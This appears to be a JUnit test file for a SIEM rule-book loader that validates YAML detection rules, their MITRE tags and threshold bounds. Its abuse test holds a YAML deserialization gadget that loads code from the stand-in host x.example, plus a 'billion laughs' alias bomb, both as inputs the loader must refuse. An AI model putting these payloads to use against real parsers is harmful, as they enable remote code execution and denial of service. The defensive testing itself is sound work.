package dev.dwarpal.siem.platform;

import dev.dwarpal.soc.SecurityEvent;
import dev.dwarpal.soc.Severity;
import dev.dwarpal.soc.Techniques;
import org.junit.jupiter.api.Test;

import java.time.Duration;
import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/** Part D: rule files are safe YAML, compiled and linted; a rule that can never fire is refused. */
class RuleBookTest {

    static final Map<String, SecurityEvent.Provenance> DATASETS = Map.of(
            "firewall", SecurityEvent.Provenance.COLLECTED,
            "cloud", SecurityEvent.Provenance.COLLECTED,
            "endpoint", SecurityEvent.Provenance.SIGNED_SENSOR);

    private static String file(String rule) {
        return "version: 1\nrules:\n" + rule;
    }

    private static String rule(String body) {
        return "  - id: r1\n    title: t\n    severity: HIGH\n    techniques: [T1071]\n" + body;
    }

    private static RuleBook.RuleLoadException refused(String yaml) {
        return assertThrows(RuleBook.RuleLoadException.class, () -> RuleBook.load(yaml, DATASETS));
    }

    private static boolean refusedFor(String yaml, String words) {
        RuleBook.RuleLoadException e = refused(yaml);
        return e.getMessage().contains(words) || e.findings().stream().anyMatch(f -> f.message().contains(words));
    }

    // ---- abuse first ----------------------------------------------------------------------------------------

    @Test
    void unsafeYamlIsRefusedWithoutEchoingIt() {
        String gadget = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://x.example/\"]]]]";
        RuleBook.RuleLoadException e = refused(gadget);
        assertFalse(e.getMessage().contains("x.example"), "parser messages quote content and are never passed on");
        StringBuilder laughs = new StringBuilder("a: &a [\"lol\",\"lol\"]\n");
        for (int i = 1; i < 10; i++) {
            laughs.append((char) ('a' + i)).append(": &").append((char) ('a' + i)).append(" [*")
                    .append((char) ('a' + i - 1)).append(",*").append((char) ('a' + i - 1)).append("]\n");
        }
        refused(laughs.toString());
        refused("version: 1\nversion: 1\nrules: []\n");
        refused("x".repeat(RuleBook.MAX_BYTES + 1));
        refused("- just\n- a list\n");
        refused("version: 2\nrules: []\n");
        refused("version: 1\nrules: []\n");
        refused("version: 1\nrules: nope\n");
        refused("version: 1\nrules: [1]\n");
        refused("version: 1\nrules: []\nextra: 1\n");
        refused(": : :");
    }

    @Test
    void rulesThatCanNeverFireAreRefused() {
        assertTrue(refusedFor(file(rule("    match: 'dataset = fierwall and action = network.flow'\n")),
                "no collector writes dataset"));
        assertTrue(refusedFor(file(rule("    match: 'dataset = firewall and dataset = cloud'\n")), "two different values"));
        assertTrue(refusedFor(file(rule("    match: 'action in (a.b, c.d) and action = e.f'\n")), "two different values"));
        assertTrue(refusedFor(file(rule("    match: 'dataset = firewall and provenance = signed_sensor'\n")),
                "never carries that provenance"));
        assertTrue(refusedFor(file(rule("    match: 'dataset = endpoint and provenance = verified_audit'\n")),
                "never carries that provenance"));
        assertTrue(refusedFor(file(rule("    match: 'dataset = dwarpal.audit and provenance = collected'\n")),
                "never carries that provenance"));
        assertTrue(refusedFor(file(rule("    match: 'category = netwrk'\n")), "bad query"));
        RuleBook ok = RuleBook.load(file(rule("    match: 'dataset = endpoint and provenance = signed_sensor'\n")),
                DATASETS);
        assertEquals(1, ok.rules().size());
        RuleBook partly = RuleBook.load(file(rule("    match: 'action = x.y and (dataset = firewall or dataset = fw2)'\n")),
                DATASETS);
        assertTrue(partly.warnings().stream().anyMatch(f -> f.message().contains("part can never match")));
    }

    @Test
    void everyRuleIsWellFormedAndMitreTagged() {
        assertTrue(refusedFor(file("  - id: r1\n    title: t\n    severity: HIGH\n    techniques: [T9999]\n"
                + "    match: 'action = a'\n"), "unknown MITRE technique"));
        assertTrue(refusedFor(file("  - id: r1\n    title: t\n    severity: HIGH\n    techniques: []\n"
                + "    match: 'action = a'\n"), "MITRE techniques"));
        assertTrue(refusedFor(file("  - id: r1\n    title: t\n    severity: HIGH\n    techniques: [T1071, T1071]\n"
                + "    match: 'action = a'\n"), "twice"));
        assertTrue(refusedFor(file("  - id: r1\n    title: t\n    severity: SEVERE\n    techniques: [T1071]\n"
                + "    match: 'action = a'\n"), "unknown severity"));
        assertTrue(refusedFor(file("  - id: R1\n    title: t\n    severity: HIGH\n    techniques: [T1071]\n"
                + "    match: 'action = a'\n"), "id:"));
        assertTrue(refusedFor(file("  - id: r..1\n    title: t\n    severity: HIGH\n    techniques: [T1071]\n"
                + "    match: 'action = a'\n"), "'..'"));
        assertTrue(refusedFor(file("  - id: r1\n    title: ' '\n    severity: HIGH\n    techniques: [T1071]\n"
                + "    match: 'action = a'\n"), "title"));
        assertTrue(refusedFor(file(rule("    match: 'action = a'\n    efect: x\n")), "unknown key"));
        assertTrue(refusedFor(file(rule("    match: 'action = a'\n    absence: {where: 'action = a', by: device, within: 1h}\n")),
                "exactly one"));
        assertTrue(refusedFor(file(rule("    match: 'action = a | count by device'\n")), "count by"));
        assertTrue(refusedFor(file(rule("    match: 'action = a'\n") + rule("    match: 'action = b'\n")),
                "duplicate rule id"));
        assertTrue(refusedFor(file(rule("    match: 7\n")), "must be a string"));
    }

    @Test
    void thresholdsSequencesAndAbsencesAreBounded() {
        String th = "    threshold: {where: 'action = a', by: device, within: %s, count: %s}\n";
        assertTrue(refusedFor(file(rule(th.formatted("1h", "1"))), "count must be"));
        assertTrue(refusedFor(file(rule(th.formatted("1h", "100000"))), "count must be"));
        assertTrue(refusedFor(file(rule(th.formatted("2d", "5"))), "within must be"));
        assertTrue(refusedFor(file(rule(th.formatted("30s", "5"))), "within must be"));
        assertTrue(refusedFor(file(rule(th.formatted("5x", "5"))), "within looks like"));
        assertTrue(refusedFor(file(rule(th.formatted("h", "5"))), "within looks like"));
        assertTrue(refusedFor(file(rule(th.formatted("1h", "5.5"))), "whole number"));
        assertTrue(refusedFor(file(rule(th.formatted("1h", "five"))), "number"));
        assertTrue(refusedFor(file(rule("    threshold: {where: 'action = a', by: [a, b, c, d], within: 1h, count: 2}\n")),
                "by names"));
        assertTrue(refusedFor(file(rule("    threshold: {where: 'action = a', by: [a, a], within: 1h, count: 2}\n")),
                "twice"));
        assertTrue(refusedFor(file(rule("    threshold: {where: 'action = a', by: at, within: 1h, count: 2}\n")),
                "field name"));
        assertTrue(refusedFor(file(rule("    threshold: {where: 'action = a', by: d, within: 1h, sum: b, distinct: c, count: 2}\n")),
                "not both"));
        assertTrue(refusedFor(file(rule("    threshold: {where: 'action = a', by: d, within: 1h, sum: b, count: 2}\n")),
                "atLeast"));
        assertTrue(refusedFor(file(rule("    threshold: {where: 'action = a', by: d, within: 1h, sum: b, atLeast: 0}\n")),
                "atLeast"));
        assertTrue(refusedFor(file(rule("    threshold: {where: 'action = a', by: d, within: 1h, count: 2, atLeast: 5}\n")),
                "atLeast goes with sum"));
        assertTrue(refusedFor(file(rule("    sequence: {by: d, within: 1h, steps: [{where: 'action = a'}]}\n")),
                "2 to"));
        assertTrue(refusedFor(file(rule("    sequence: {by: d, within: 1h, steps: [{where: 'action = a', min: 0}, "
                + "{where: 'action = b'}]}\n")), "min must be"));
        assertTrue(refusedFor(file(rule("    sequence: {by: d, within: 1h, steps: [{where: 'action = a', x: 1}, "
                + "{where: 'action = b'}]}\n")), "unknown key"));
        assertTrue(refusedFor(file(rule("    absence: {where: 'action = a', by: d, within: 2m}\n")), "within must be"));
        assertTrue(refusedFor(file(rule("    absence: {where: 'action = a', by: d, within: 8d}\n")), "within must be"));
        assertTrue(refusedFor(file(rule("    absence: [1]\n")), "mapping"));

        RuleBook b = RuleBook.load(file(rule("    threshold: {where: 'action = a', by: [device, dst], within: 90s, "
                + "distinct: user, count: 3}\n")), DATASETS);
        RuleBook.Rule r = b.rules().getFirst();
        assertEquals(RuleBook.Kind.THRESHOLD, r.kind());
        assertEquals(RuleBook.Measure.DISTINCT, r.measure());
        assertEquals(Duration.ofSeconds(90), r.within());
        assertEquals(List.of("device", "dst"), r.by());
        assertTrue(b.warnings().isEmpty());
        assertEquals(Duration.ofDays(1), RuleBook.duration("1d", "x", Duration.ZERO, Duration.ofDays(2)));
    }

    // ---- the shipped rules ----------------------------------------------------------------------------------

    @Test
    void theDefaultRulesLoadCleanAndCoverTheCrossSourceAttacksWhilePartAKeepsItsOwnRules() {
        RuleBook b = RuleBook.defaults(DATASETS);
        assertTrue(b.rules().size() >= 10);
        List<String> ids = b.rules().stream().map(RuleBook.Rule::id).toList();
        assertTrue(ids.stream().noneMatch(i -> i.startsWith("cr-")), "part A's engine runs part A's rules");
        List<String> partA = RuleBook.partAEquivalents(DATASETS).rules().stream().map(RuleBook.Rule::id).toList();
        for (String a : List.of("cr-break-glass-used", "cr-honeytoken-touched", "cr-deny-storm-subject",
                "cr-deny-storm-ip", "cr-mfa-fatigue", "cr-pam-refused")) {
            assertTrue(partA.contains(a), a);
        }
        for (String x : List.of("stolen-laptop-collection", "stolen-laptop-access", "beacon-regular-destination",
                "beacon-from-document-process", "cloud-download-volume", "cloud-bulk-download-then-external-share",
                "sensor-heartbeat-missing")) {
            assertTrue(ids.contains(x), x);
        }
        for (RuleBook.Kind k : RuleBook.Kind.values()) {
            assertTrue(b.rules().stream().anyMatch(r -> r.kind() == k), "every kind is used: " + k);
        }
        assertEquals(List.of(Techniques.APPLICATION_LAYER_PROTOCOL), b.techniques("beacon-regular-destination"));
        assertTrue(b.techniques("nope").isEmpty());
        assertEquals(Severity.CRITICAL, b.rule("stolen-laptop-access").orElseThrow().severity());
        assertTrue(b.warnings().isEmpty(), b.warnings().toString());
        assertFalse(b.rule("nope").isPresent());
    }

    @Test
    void aCriticalRuleOnCollectedEvidenceOnlyIsWarnedAbout() {
        RuleBook b = RuleBook.load(file("  - id: r1\n    title: t\n    severity: CRITICAL\n    techniques: [T1071]\n"
                + "    match: 'dataset = firewall and action = network.flow'\n"
                + "  - id: r2\n    title: t\n    severity: LOW\n    techniques: [T1071]\n"
                + "    match: 'dport = 4444'\n"), DATASETS);
        assertEquals(2, b.warnings().size());
        assertTrue(b.warnings().getFirst().toString().contains("collected"));
        assertTrue(b.warnings().get(1).message().contains("every event"));
    }
}
